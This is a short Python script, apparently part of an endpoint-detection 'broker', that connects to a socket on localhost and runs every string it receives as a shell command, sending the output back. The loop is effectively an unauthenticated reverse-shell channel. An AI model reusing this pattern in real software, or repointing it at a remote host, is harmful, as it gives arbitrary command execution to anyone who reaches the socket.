#######################
# >>> EDR BROCKER <<< #
#   - KTSO-02-19 -    #
#   Date: 16.12.2022  #
#   Time: 2:52        #
#######################

import os
import wmi
import time
import socket
import winapps
import schedule
import win32evtlog
import subprocess

RPORT = 8080
RHOST = "127.0.0.1"

if __name__ == '__main__':
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as SOCKET_CHANNEL:
            SOCKET_CHANNEL.bind(('127.0.0.1', 65531))
            SOCKET_CHANNEL.connect((RHOST, RPORT))
            while True:
                try:
                    request = SOCKET_CHANNEL.recv(1024)
                    if request:
                        print(request)
                        result = subprocess.Popen(request.decode(),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        out,err=result.communicate()
                        print(out)
                        SOCKET_CHANNEL.send(f'<CONSOLE_BEGIN>{out}'.encode())
                        continue
                except socket.timeout:
                    pass
                except:
                    SOCKET_CHANNEL.close()
    except BaseException as e:
        print(e)
        print("[-] ERROR! Sessions is died! {-400}")
        exit(-400)
